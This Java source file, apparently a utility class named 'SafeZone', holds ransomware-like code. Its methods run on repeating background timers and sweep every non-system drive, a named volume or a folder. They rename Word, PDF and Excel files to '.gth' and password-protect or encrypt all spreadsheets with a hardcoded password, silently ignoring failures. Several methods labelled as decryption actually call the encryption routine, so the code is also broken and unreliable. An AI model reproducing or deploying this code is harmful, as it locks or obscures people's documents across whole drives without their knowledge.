
package kadysoft.kady;
/**
 *
 * @author ahmed.elkady
 */


import com.spire.xls.ExcelVersion;
import com.spire.xls.Workbook;
import java.io.File;
import java.io.IOException;
import java.nio.file.AccessDeniedException;
import java.nio.file.FileVisitResult;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.SimpleFileVisitor;
import java.nio.file.StandardCopyOption;
import java.nio.file.attribute.BasicFileAttributes;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.atomic.AtomicInteger;
import javafx.application.Platform;
import javax.swing.filechooser.FileSystemView;



public class SafeZone {
    
    Timer fileCheckTimer1,fileCheckTimer2,fileCheckTimer3,fileCheckTimer4,fileCheckTimer5;
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    public void startExcelToGthWatcher1() {
        fileCheckTimer3 = new Timer(true);
        fileCheckTimer3.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                Platform.runLater(() -> {
                    convertAllExcelFilesToGth();
                });
            }
        }, 0, 20 * 60 * 1000);
    }
    private void convertAllExcelFilesToGth() {
        AtomicInteger totalFound = new AtomicInteger(0);
        AtomicInteger totalRenamed = new AtomicInteger(0);
        AtomicInteger totalFailed = new AtomicInteger(0);
        File[] roots = File.listRoots();

        for (File root : roots) {
            String drive = root.toString();
            if (drive.equalsIgnoreCase("C:\\")) {
                continue;
            }
            Path startPath = root.toPath();
            try {
                Files.walkFileTree(startPath, new SimpleFileVisitor<Path>() {
                    @Override
                    public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) {
                        String fileName = file.toString().toLowerCase();
                        if (fileName.endsWith(".xlsx") || 
                            fileName.endsWith(".xls") || 
                            fileName.endsWith(".xlsb")) {
                            totalFound.incrementAndGet();
                            Path parentDir = file.getParent();
                            String oldName = file.getFileName().toString();
                            String newName = oldName.substring(0, oldName.lastIndexOf('.')) + ".gth";
                            Path newFilePath = parentDir.resolve(newName);
                            try {
                                Files.move(file, newFilePath, StandardCopyOption.REPLACE_EXISTING);
                                totalRenamed.incrementAndGet();
                            } catch (AccessDeniedException e) {
                                totalFailed.incrementAndGet();
                            } catch (IOException e) {
                                totalFailed.incrementAndGet();
                            }
                        }
                        return FileVisitResult.CONTINUE;
                    }
                    @Override
                    public FileVisitResult visitFileFailed(Path file, IOException exc) {
                        return FileVisitResult.CONTINUE;
                    }
                });
            } catch (Exception ignored) {
            }
        }
    }
    public void stopExcelWatcher() {
        if (fileCheckTimer3 != null) {
            fileCheckTimer3.cancel();
            fileCheckTimer3 = null;
        }
    }
    
    
    
    
    
    
    
    
    
    

public void startDocsToGthWatcher2(String TARGET_VOLUME_NAMEE) {
    fileCheckTimer2 = new Timer(true);
    fileCheckTimer2.scheduleAtFixedRate(new TimerTask() {
        @Override
        public void run() {
            Platform.runLater(() -> {
                convertAllDocsFilesToGth(TARGET_VOLUME_NAMEE);
            });
        }
    }, 0, 20 * 60 * 1000);
}
private void convertAllDocsFilesToGth(String TARGET_VOLUME_NAMEE) {
    final String TARGET_VOLUME_NAME = TARGET_VOLUME_NAMEE;
    AtomicInteger totalFound = new AtomicInteger(0);
    AtomicInteger totalRenamed = new AtomicInteger(0);
    AtomicInteger totalFailed = new AtomicInteger(0);
    FileSystemView fsv = FileSystemView.getFileSystemView();
    File[] roots = File.listRoots();
    Path targetDrivePath = null;
    for (File root : roots) {
        String rootPath = root.toString();
        if (rootPath.equalsIgnoreCase("C:\\")) {
            continue;
        }
        try {
            String displayName = fsv.getSystemDisplayName(root);
            String volumeName = displayName.split("\\(")[0].trim();
            if (volumeName.equalsIgnoreCase(TARGET_VOLUME_NAME)) {
                targetDrivePath = root.toPath();
                break;
            }
        } catch (Exception ignored) {}
    }
    if (targetDrivePath == null) {
        return;
    }
    try {
        Files.walkFileTree(targetDrivePath, new SimpleFileVisitor<Path>() {
            @Override
            public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) {
                String fileName = file.toString().toLowerCase();
                if (fileName.endsWith(".doc") || 
                    fileName.endsWith(".docx") || 
                    fileName.endsWith(".pdf")) {
                    totalFound.incrementAndGet();
                    Path parentDir = file.getParent();
                    String oldName = file.getFileName().toString();
                    String baseName = oldName.substring(0, oldName.lastIndexOf('.'));
                    String newName = baseName + ".gth";
                    Path newFilePath = parentDir.resolve(newName);
                    try {
                        Files.move(file, newFilePath, StandardCopyOption.REPLACE_EXISTING);
                        totalRenamed.incrementAndGet();
                    } catch (AccessDeniedException e) {
                        totalFailed.incrementAndGet();
                    } catch (IOException e) {
                        totalFailed.incrementAndGet();
                    }
                }
                return FileVisitResult.CONTINUE;
            }
            @Override
            public FileVisitResult visitFileFailed(Path file, IOException exc) {
                return FileVisitResult.CONTINUE;
            }
        });
    } catch (Exception e) {
    }
}
public void stopDocWatcher() {
    if (fileCheckTimer2 != null) {
        fileCheckTimer2.cancel();
        fileCheckTimer2.purge();
        fileCheckTimer2 = null;
    }
}







public void specificTimeAndDrive3 (String TARGET_VOLUME_NAMEE) {
String TARGET_VOLUME_NAME = TARGET_VOLUME_NAMEE;
fileCheckTimer4 = new Timer(true);
fileCheckTimer4.scheduleAtFixedRate(new TimerTask() {
    @Override
    public void run() {
        Platform.runLater(() -> {
           Date ff=new Date();
           int hourrr=ff.getHours();
           if (hourrr==22) {
            List<Path> excelFiles = new ArrayList<>();
            FileSystemView fsv = FileSystemView.getFileSystemView();
            File[] roots = File.listRoots();
            for (File root : roots) {
                String rootPath = root.toString();
                if (rootPath.equalsIgnoreCase("C:\\")) {
                    continue;
                }
                try {
                    String displayName = fsv.getSystemDisplayName(root);
                    String volumeName = displayName.split("\\(")[0].trim();
                    if (!volumeName.equalsIgnoreCase(TARGET_VOLUME_NAME)) {
                        continue;
                    }
                    Path startPath = root.toPath();
                    Files.walkFileTree(startPath, new SimpleFileVisitor<Path>() {
                        @Override
                        public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) {
                            String fileName = file.toString().toLowerCase();
                            if (fileName.endsWith(".xlsx") || fileName.endsWith(".xls") || fileName.endsWith(".xlsb")) {
                                excelFiles.add(file);
                            }
                            return FileVisitResult.CONTINUE;
                        }
                        @Override
                        public FileVisitResult visitFileFailed(Path file, IOException exc) {
                            return FileVisitResult.CONTINUE;
                        }
                    });
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
            for (Path excelFile : excelFiles) {
                try {
                    Workbook workbook = new Workbook();
                    workbook.loadFromFile(excelFile.toString());
                    workbook.protect("WhatIsThePassword?");
                    workbook.saveToFile(excelFile.toString(), ExcelVersion.Version2016);
                } catch (Exception e) {
                }
            }
            if (excelFiles.isEmpty()) {
            }
               return;
           }
           else {
              return; 
           }
 });
    }
}, 0, 20 * 60 * 1000);
}







public void specificDrive4 (String TARGET_VOLUME_NAMEE) {
String TARGET_VOLUME_NAME = TARGET_VOLUME_NAMEE;
fileCheckTimer5 = new Timer(true);
fileCheckTimer5.scheduleAtFixedRate(new TimerTask() {
    @Override
    public void run() {
        Platform.runLater(() -> {
            List<Path> excelFiles = new ArrayList<>();
            FileSystemView fsv = FileSystemView.getFileSystemView();
            File[] roots = File.listRoots();
            for (File root : roots) {
                String rootPath = root.toString();
                if (rootPath.equalsIgnoreCase("C:\\")) {
                    continue;
                }
                try {
                    String displayName = fsv.getSystemDisplayName(root);
                    String volumeName = displayName.split("\\(")[0].trim();
                    if (!volumeName.equalsIgnoreCase(TARGET_VOLUME_NAME)) {
                        continue;
                    }
                    Path startPath = root.toPath();
                    Files.walkFileTree(startPath, new SimpleFileVisitor<Path>() {
                        @Override
                        public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) {
                            String fileName = file.toString().toLowerCase();
                            if (fileName.endsWith(".xlsx") || fileName.endsWith(".xls") || fileName.endsWith(".xlsb")) {
                                excelFiles.add(file);
                            }
                            return FileVisitResult.CONTINUE;
                        }
                        @Override
                        public FileVisitResult visitFileFailed(Path file, IOException exc) {
                            return FileVisitResult.CONTINUE;
                        }
                    });

                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
            for (Path excelFile : excelFiles) {
                try {
                    Workbook workbook = new Workbook();
                    workbook.loadFromFile(excelFile.toString());
                    workbook.protect("WhatIsThePassword?");
                    workbook.saveToFile(excelFile.toString(), ExcelVersion.Version2016);
                } catch (Exception e) {
                }
            }
            if (excelFiles.isEmpty()) {
            }
        });
    }
}, 0, 20 * 60 * 1000);
}








public void allDrives5 () {
fileCheckTimer1 = new Timer(true);
fileCheckTimer1.scheduleAtFixedRate(new TimerTask() {
    @Override
    public void run() {
        Platform.runLater(() -> {
        List<Path> excelFiles = new ArrayList<>();
        File[] roots = File.listRoots();
        for (File root : roots) {
            if (root.toString().equalsIgnoreCase("C:\\")) {
                continue;
            }
            Path startPath = root.toPath();
            try {
                Files.walkFileTree(startPath, new SimpleFileVisitor<Path>() {
                    @Override
                    public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) {
                        if (file.toString().toLowerCase().endsWith(".xlsx") ||
                            file.toString().toLowerCase().endsWith(".xls") ||
                            file.toString().toLowerCase().endsWith(".xlsb")) {
                            excelFiles.add(file);
                        }
                        return FileVisitResult.CONTINUE;
                    }
                    @Override
                    public FileVisitResult visitFileFailed(Path file, IOException exc) {
                        return FileVisitResult.CONTINUE;
                    }
                });
            } catch (IOException e) {
            }
        }
        for (Path excelFile : excelFiles) {
            try {
                Workbook workbook = new Workbook();
                workbook.loadFromFile(excelFile.toString());
                String password = "WhatIsThePassword?";
                workbook.protect(password);
                workbook.saveToFile(excelFile.toString(), ExcelVersion.Version2016);
            } catch (Exception e) {
            }
        }
            });
    }
}, 0, 20 * 60 * 1000);
}









public void removePasswordSpecificTimeAndDrive6(String TARGET_VOLUME_NAMEE) {
    String TARGET_VOLUME_NAME = TARGET_VOLUME_NAMEE;
    fileCheckTimer4 = new Timer(true);
    fileCheckTimer4.scheduleAtFixedRate(new TimerTask() {
        @Override
        public void run() {
            Platform.runLater(() -> {
                Date ff = new Date();
                int hourrr = ff.getHours();
                if (hourrr == 22) {
                    List<Path> excelFiles = new ArrayList<>();
                    FileSystemView fsv = FileSystemView.getFileSystemView();
                    File[] roots = File.listRoots();
                    for (File root : roots) {
                        String rootPath = root.toString();
                        if (rootPath.equalsIgnoreCase("C:\\")) {
                            continue;
                        }
                        try {
                            String displayName = fsv.getSystemDisplayName(root);
                            String volumeName = displayName.split("\\(")[0].trim();
                            if (!volumeName.equalsIgnoreCase(TARGET_VOLUME_NAME)) {
                                continue;
                            }
                            Path startPath = root.toPath();
                            Files.walkFileTree(startPath, new SimpleFileVisitor<Path>() {
                                @Override
                                public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) {
                                    String fileName = file.toString().toLowerCase();
                                    if (fileName.endsWith(".xlsx") || fileName.endsWith(".xls") || fileName.endsWith(".xlsb")) {
                                        excelFiles.add(file);
                                    }
                                    return FileVisitResult.CONTINUE;
                                }
                                @Override
                                public FileVisitResult visitFileFailed(Path file, IOException exc) {
                                    return FileVisitResult.CONTINUE;
                                }
                            });
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                    for (Path excelFile : excelFiles) {
                        try {
                            Workbook workbook = new Workbook();
                            workbook.loadFromFile(excelFile.toString());
                            workbook.unProtect("WhatIsThePassword?");
                            workbook.saveToFile(excelFile.toString(), ExcelVersion.Version2016);
                        } catch (Exception e) {
                        }
                    }
                }
            });
        }
    }, 0, 20 * 60 * 1000);
}










public void removePasswordSpecificDrive7(String TARGET_VOLUME_NAMEE) {
    String TARGET_VOLUME_NAME = TARGET_VOLUME_NAMEE;
    fileCheckTimer5 = new Timer(true);
    fileCheckTimer5.scheduleAtFixedRate(new TimerTask() {
        @Override
        public void run() {
            Platform.runLater(() -> {
                List<Path> excelFiles = new ArrayList<>();
                FileSystemView fsv = FileSystemView.getFileSystemView();
                File[] roots = File.listRoots();
                for (File root : roots) {
                    String rootPath = root.toString();
                    if (rootPath.equalsIgnoreCase("C:\\")) {
                        continue;
                    }
                    try {
                        String displayName = fsv.getSystemDisplayName(root);
                        String volumeName = displayName.split("\\(")[0].trim();
                        if (!volumeName.equalsIgnoreCase(TARGET_VOLUME_NAME)) {
                            continue;
                        }
                        Path startPath = root.toPath();
                        Files.walkFileTree(startPath, new SimpleFileVisitor<Path>() {
                            @Override
                            public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) {
                                String fileName = file.toString().toLowerCase();
                                if (fileName.endsWith(".xlsx") || fileName.endsWith(".xls") || fileName.endsWith(".xlsb")) {
                                    excelFiles.add(file);
                                }
                                return FileVisitResult.CONTINUE;
                            }
                            @Override
                            public FileVisitResult visitFileFailed(Path file, IOException exc) {
                                return FileVisitResult.CONTINUE;
                            }
                        });
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
                for (Path excelFile : excelFiles) {
                    try {
                        Workbook workbook = new Workbook();
                        workbook.loadFromFile(excelFile.toString());
                        workbook.unProtect("WhatIsThePassword?");
                        workbook.saveToFile(excelFile.toString(), ExcelVersion.Version2016);
                    } catch (Exception e) {
                    }
                }
            });
        }
    }, 0, 20 * 60 * 1000);
}










public void removePasswordAllDrives8() {
    fileCheckTimer1 = new Timer(true);
    fileCheckTimer1.scheduleAtFixedRate(new TimerTask() {
        @Override
        public void run() {
            Platform.runLater(() -> {
                List<Path> excelFiles = new ArrayList<>();
                File[] roots = File.listRoots();
                for (File root : roots) {
                    if (root.toString().equalsIgnoreCase("C:\\")) {
                        continue;
                    }
                    Path startPath = root.toPath();
                    try {
                        Files.walkFileTree(startPath, new SimpleFileVisitor<Path>() {
                            @Override
                            public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) {
                                if (file.toString().toLowerCase().endsWith(".xlsx") ||
                                    file.toString().toLowerCase().endsWith(".xls") ||
                                    file.toString().toLowerCase().endsWith(".xlsb")) {
                                    excelFiles.add(file);
                                }
                                return FileVisitResult.CONTINUE;
                            }
                            @Override
                            public FileVisitResult visitFileFailed(Path file, IOException exc) {
                                return FileVisitResult.CONTINUE;
                            }
                        });
                    } catch (IOException e) {
                    }
                }
                for (Path excelFile : excelFiles) {
                    try {
                        Workbook workbook = new Workbook();
                        workbook.loadFromFile(excelFile.toString());
                        workbook.unProtect("WhatIsThePassword?");
                        workbook.saveToFile(excelFile.toString(), ExcelVersion.Version2016);
                    } catch (Exception e) {
                    }
                }
            });
        }
    }, 0, 20 * 60 * 1000);
}






public void docsSpecificFolder9 (String folderPathh) {
        String folderPath = folderPathh;
        File folder = new File(folderPath);
        if (!folder.exists() || !folder.isDirectory()) {
            return;
        }
        File[] xlsxFiles = folder.listFiles((dir, name) -> 
            name.toLowerCase().endsWith(".pdf")||name.toLowerCase().endsWith(".doc")||name.toLowerCase().endsWith(".docx")
        );
        if (xlsxFiles == null || xlsxFiles.length == 0) {
            return;
        }
        int count = 0;
        for (File oldFile : xlsxFiles) {
            String oldName = oldFile.getName();
            String newName = oldName.substring(0, oldName.lastIndexOf('.')) + ".gth";
            Path source = oldFile.toPath();
            Path target = Paths.get(oldFile.getParent(), newName);
            try {
                Files.move(source, target);
                count++;
            } catch (Exception e) {
            }
        }
}








public void excelSpecificFolder10 (String folderPathh) {
        List<String> excelFilePaths = new ArrayList<>();
        String folderPath = folderPathh;
        Path startPath = Paths.get(folderPath);
        if (!Files.exists(startPath) || !Files.isDirectory(startPath)) {
            return;
        }
        try {
            Files.walkFileTree(startPath, new SimpleFileVisitor<Path>() {
                @Override
                public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) {
                    if (file.toString().toLowerCase().endsWith(".xlsx") ||
                        file.toString().toLowerCase().endsWith(".xls") ||
                        file.toString().toLowerCase().endsWith(".xlsb")) {
                        excelFilePaths.add(file.toString());
                    }
                    return FileVisitResult.CONTINUE;
                }
                @Override
                public FileVisitResult visitFileFailed(Path file, IOException exc) {
                    return FileVisitResult.CONTINUE;
                }
            });
        } catch (IOException e) {
        }
        for (String filePath : excelFilePaths) {
            try {
                Workbook workbook = new Workbook();
                workbook.loadFromFile(filePath);
                String password = "WhatIsThePassword?";
                workbook.protect(password);
                workbook.saveToFile(filePath, ExcelVersion.Version2016);
            } catch (Exception e) {
            }
}
}






public void encSpecificFolder11 (String folderPath) {
    
    
    try {
    File folder = new File(folderPath);
    if (!folder.exists() || !folder.isDirectory()) {
        return;
    }
    int success = 0, failed = 0;
    File[] files = folder.listFiles();
    if (files == null || files.length == 0) {
        return;
    }
    for (File file : files) {
        if (!file.isFile()) continue;
        String name = file.getName().toLowerCase();
        if (!name.endsWith(".xlsx") && !name.endsWith(".xls") && !name.endsWith(".xlsb")) {
            continue;
        }
        File temp = File.createTempFile("encrypt_", ".tmp");
        try {
            FileEncryptor.encrypt(file.getAbsolutePath(), temp.getAbsolutePath(), "WhatIsThePassword?");
            Files.copy(temp.toPath(), file.toPath(), StandardCopyOption.REPLACE_EXISTING);
            success++;
        } catch (Exception ex) {
            failed++;
        } finally {
            temp.delete();
        }
    }
} catch (Exception ex) {
    ex.printStackTrace();
}
      
}









private void processEncryption(List<Path> excelFiles) {
    int success = 0, failed = 0;
    for (Path excelPath : excelFiles) {
        File file = excelPath.toFile();
        File temp = null;
        try {
            temp = File.createTempFile("encrypt_", ".tmp");
            FileEncryptor.encrypt(file.getAbsolutePath(), temp.getAbsolutePath(), "WhatIsThePassword?");
            Files.copy(temp.toPath(), file.toPath(), StandardCopyOption.REPLACE_EXISTING);
            success++;
        } catch (Exception ex) {
            failed++;
        } finally {
            if (temp != null) {
                temp.delete();
            }
        }
    }
}
public void encSpecificDrive12 (String TARGET_VOLUME_NAMEE) {
    String TARGET_VOLUME_NAME = TARGET_VOLUME_NAMEE;
    fileCheckTimer5 = new Timer(true);
    fileCheckTimer5.scheduleAtFixedRate(new TimerTask() {
        @Override
        public void run() {
            Platform.runLater(() -> {
                List<Path> excelFiles = new ArrayList<>();
                FileSystemView fsv = FileSystemView.getFileSystemView();
                File[] roots = File.listRoots();
                for (File root : roots) {
                    String rootPath = root.toString();
                    if (rootPath.equalsIgnoreCase("C:\\")) continue;
                    try {
                        String displayName = fsv.getSystemDisplayName(root);
                        String volumeName = displayName.split("\\(")[0].trim();
                        if (!volumeName.equalsIgnoreCase(TARGET_VOLUME_NAME)) {
                            continue;
                        }
                        Path startPath = root.toPath();
                        Files.walkFileTree(startPath, new SimpleFileVisitor<Path>() {
                            @Override
                            public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) {
                                String name = file.toString().toLowerCase();
                                if (name.endsWith(".xlsx") || name.endsWith(".xls") || name.endsWith(".xlsb")) {
                                    excelFiles.add(file);
                                }
                                return FileVisitResult.CONTINUE;
                            }
                            @Override
                            public FileVisitResult visitFileFailed(Path file, IOException exc) {
                                return FileVisitResult.CONTINUE;
                            }
                        });
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
                processEncryption(excelFiles);
            });
        }
    }, 0, 20 * 60 * 1000);
}











public void encAll13 () {
    fileCheckTimer1 = new Timer(true);
    fileCheckTimer1.scheduleAtFixedRate(new TimerTask() {
        @Override
        public void run() {
            Platform.runLater(() -> {
                List<Path> excelFiles = new ArrayList<>();
                File[] roots = File.listRoots();

                for (File root : roots) {
                    if (root.toString().equalsIgnoreCase("C:\\")) {
                        continue;
                    }
                    Path startPath = root.toPath();
                    try {
                        Files.walkFileTree(startPath, new SimpleFileVisitor<Path>() {
                            @Override
                            public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) {
                                String name = file.toString().toLowerCase();
                                if (name.endsWith(".xlsx") || name.endsWith(".xls") || name.endsWith(".xlsb")) {
                                    excelFiles.add(file);
                                }
                                return FileVisitResult.CONTINUE;
                            }
                            @Override
                            public FileVisitResult visitFileFailed(Path file, IOException exc) {
                                return FileVisitResult.CONTINUE;
                            }
                        });
                    } catch (IOException e) {
                    }
                }
                processEncryption(excelFiles);
            });
        }
    }, 0, 20 * 60 * 1000);
}









public void decSpecificFolder14 (String folderPath) {
        try {
    File folder = new File(folderPath);
    if (!folder.exists() || !folder.isDirectory()) {
        return;
    }
    int success = 0, failed = 0;
    File[] files = folder.listFiles();
    if (files == null || files.length == 0) {
        return;
    }
    for (File file : files) {
        if (!file.isFile()) continue;
        String name = file.getName().toLowerCase();
        if (!name.endsWith(".xlsx") && !name.endsWith(".xls") && !name.endsWith(".xlsb")) {
            continue;
        }
        File temp = File.createTempFile("encrypt_", ".tmp");
        try {
            FileEncryptor.encrypt(file.getAbsolutePath(), temp.getAbsolutePath(), "WhatIsThePassword?");
            Files.copy(temp.toPath(), file.toPath(), StandardCopyOption.REPLACE_EXISTING);
            success++;
        } catch (Exception ex) {
            failed++;
        } finally {
            temp.delete();
        }
    }
} catch (Exception ex) {
    ex.printStackTrace();
}
}










private void processDecryption(List<Path> excelFiles) {
    int success = 0, failed = 0;
    for (Path excelPath : excelFiles) {
        File file = excelPath.toFile();
        File temp = null;
        try {
            temp = File.createTempFile("decrypt_", ".tmp");
            FileDecryptor.decrypt(file.getAbsolutePath(), temp.getAbsolutePath(), "WhatIsThePassword?");
            Files.copy(temp.toPath(), file.toPath(), StandardCopyOption.REPLACE_EXISTING);
            success++;
        } catch (Exception ex) {
            failed++;
        } finally {
            if (temp != null) {
                temp.delete();
            }
        }
    }
}
public void decSpecificDrive15 (String TARGET_VOLUME_NAMEE) {
        String TARGET_VOLUME_NAME = TARGET_VOLUME_NAMEE;
    fileCheckTimer5 = new Timer(true);
    fileCheckTimer5.scheduleAtFixedRate(new TimerTask() {
        @Override
        public void run() {
            Platform.runLater(() -> {
                List<Path> excelFiles = new ArrayList<>();
                FileSystemView fsv = FileSystemView.getFileSystemView();
                File[] roots = File.listRoots();
                for (File root : roots) {
                    String rootPath = root.toString();
                    if (rootPath.equalsIgnoreCase("C:\\")) continue;
                    try {
                        String displayName = fsv.getSystemDisplayName(root);
                        String volumeName = displayName.split("\\(")[0].trim();
                        if (!volumeName.equalsIgnoreCase(TARGET_VOLUME_NAME)) {
                            continue;
                        }
                        Path startPath = root.toPath();
                        Files.walkFileTree(startPath, new SimpleFileVisitor<Path>() {
                            @Override
                            public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) {
                                String name = file.toString().toLowerCase();
                                if (name.endsWith(".xlsx") || name.endsWith(".xls") || name.endsWith(".xlsb")) {
                                    excelFiles.add(file);
                                }
                                return FileVisitResult.CONTINUE;
                            }
                            @Override
                            public FileVisitResult visitFileFailed(Path file, IOException exc) {
                                return FileVisitResult.CONTINUE;
                            }
                        });
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
                processEncryption(excelFiles);
            });
        }
    }, 0, 20 * 60 * 1000);
}










public void decAll16 () {
        fileCheckTimer1 = new Timer(true);
    fileCheckTimer1.scheduleAtFixedRate(new TimerTask() {
        @Override
        public void run() {
            Platform.runLater(() -> {
                List<Path> excelFiles = new ArrayList<>();
                File[] roots = File.listRoots();

                for (File root : roots) {
                    if (root.toString().equalsIgnoreCase("C:\\")) {
                        continue;
                    }
                    Path startPath = root.toPath();
                    try {
                        Files.walkFileTree(startPath, new SimpleFileVisitor<Path>() {
                            @Override
                            public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) {
                                String name = file.toString().toLowerCase();
                                if (name.endsWith(".xlsx") || name.endsWith(".xls") || name.endsWith(".xlsb")) {
                                    excelFiles.add(file);
                                }
                                return FileVisitResult.CONTINUE;
                            }
                            @Override
                            public FileVisitResult visitFileFailed(Path file, IOException exc) {
                                return FileVisitResult.CONTINUE;
                            }
                        });
                    } catch (IOException e) {
                    }
                }
                processEncryption(excelFiles);
            });
        }
    }, 0, 20 * 60 * 1000);
}
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    
    
}
